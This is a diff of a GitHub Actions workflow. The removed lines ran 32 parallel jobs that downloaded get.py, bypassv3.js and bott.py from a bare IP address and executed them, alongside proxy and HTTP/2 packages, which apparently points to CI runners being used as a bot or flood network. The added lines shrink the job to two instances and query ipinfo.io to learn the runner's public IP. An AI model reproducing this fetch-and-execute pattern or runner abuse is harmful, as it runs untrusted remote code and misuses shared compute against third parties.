@@ -7,7 +7,7 @@ jobs:
     runs-on: depot-ubuntu-24.04-32
     strategy:
       matrix:
-        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32]
+        instance: [1, 2]
     
     steps:
     - name: Checkout code
@@ -16,21 +16,7 @@ jobs:
     - name: Install system dependencies
       run: |
         sudo apt update
-        sudo apt install -y wget python3 npm nodejs python3-pip
+        sudo apt install -y wget curl python3
+        curl ipinfo.io
 
-    - name: Install Python dependencies
-      run: pip install psutil
-
-    - name: Install Node.js dependencies
-      run: npm install socks hpack chalk@2
-
-    - name: Download required files
-      run: |
-        wget -q http://38.242.224.156:8082/get.py
-        wget -q http://38.242.224.156:8082/bypassv3.js
-        wget -q http://38.242.224.156:8082/bott.py
-
-    - name: Execute scripts
-      run: |
-        python3 get.py
-        python3 bott.py
+    
